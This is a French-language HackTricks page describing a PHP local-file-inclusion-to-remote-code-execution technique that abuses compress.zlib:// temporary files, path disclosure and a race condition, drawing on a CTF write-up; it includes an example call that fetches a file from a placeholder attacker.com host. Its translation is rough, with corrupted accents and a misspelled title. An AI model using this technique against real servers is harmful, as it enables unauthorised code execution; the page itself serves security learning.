# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Divulgation de chemin

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

***

### `compress.zlib://` et `PHP_STREAM_PREFER_STDIO`

Un fichier ouvert en utilisant le protocole `compress.zlib://` avec le drapeau `PHP_STREAM_PREFER_STDIO` peut continuer √† √©crire des donn√©es qui arrivent √† la connexion plus tard dans le m√™me fichier.

Cela signifie qu'un appel tel que:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Vous enverrez une requ√™te demandant http://attacker.com/file, puis le serveur pourrait r√©pondre √† la requ√™te avec une r√©ponse HTTP valide, maintenir la connexion ouverte, et envoyer des donn√©es suppl√©mentaires un peu plus tard qui seront √©galement √©crites dans le fichier.

Vous pouvez voir cette information dans cette partie du code php-src dans main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Course √† la condition de RCE

[**Ce CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) a √©t√© r√©solu en utilisant le tour pr√©c√©dent.

L'attaquant fera en sorte que le **serveur victime ouvre une connexion pour lire un fichier depuis le serveur de l'attaquant** en utilisant le protocole **`compress.zlib`**.

**Pendant que** cette **connexion** existe, l'attaquant **exfiltrera le chemin** vers le fichier temporaire cr√©√© (il est divulgu√© par le serveur).

**Pendant que** la **connexion** est toujours ouverte, l'attaquant exploitera une LFI chargeant le fichier temporaire qu'il contr√¥le.

Cependant, il y a une v√©rification dans le serveur web qui **emp√™che le chargement des fichiers contenant `<?`**. Par cons√©quent, l'attaquant exploitera une **Course Condition**. Dans la connexion qui est toujours ouverte, l'**attaquant** enverra la charge PHP **APR√àS** que le **serveur web** ait **v√©rifi√©** si le fichier contient les caract√®res interdits mais **AVANT de charger son contenu**.

Pour plus d'informations, consultez la description de la Course Condition et du CTF sur [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
